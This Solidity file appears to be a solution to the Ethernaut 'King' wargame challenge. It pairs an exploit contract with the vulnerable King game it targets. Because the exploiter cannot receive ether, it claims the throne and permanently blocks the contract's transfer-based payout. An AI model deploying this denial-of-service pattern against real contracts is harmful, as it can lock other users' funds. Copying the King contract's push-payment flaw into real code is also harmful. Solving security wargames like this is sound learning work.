// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingExploiter {
    King public king = King(0x33FcAeF1483BE280cD7021e055A2B34592582887);
    
    function addValue() public payable {
    }
    
    function exploit() public {
        (bool result,) = address(king).call.value(1000000000000000000).gas(60000)('');
    }

}

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}